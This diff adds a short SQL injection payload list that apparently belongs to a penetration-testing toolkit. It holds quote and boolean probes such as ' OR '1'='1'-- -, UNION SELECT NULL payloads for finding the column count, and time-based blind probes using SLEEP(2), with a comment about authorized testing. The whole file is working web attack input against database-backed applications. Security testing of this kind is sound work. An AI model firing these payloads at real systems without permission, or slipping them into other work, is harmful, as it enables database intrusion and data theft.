@@ -1,0 +1,19 @@
+# Low-impact syntax / boolean probes
+'
+"
+')
+")
+' OR '1'='1'-- -
+" OR "1"="1"-- -
+1 OR 1=1
+1 AND 1=2
+
+# UNION shape discovery (adjust column count in authorized testing)
+1 UNION SELECT NULL-- -
+1 UNION SELECT NULL,NULL-- -
+1 UNION SELECT NULL,NULL,NULL-- -
+
+# Time-based confirmation with short delay
+1 AND SLEEP(2)-- -
+1' AND SLEEP(2)-- -
+1);SELECT SLEEP(2)-- -
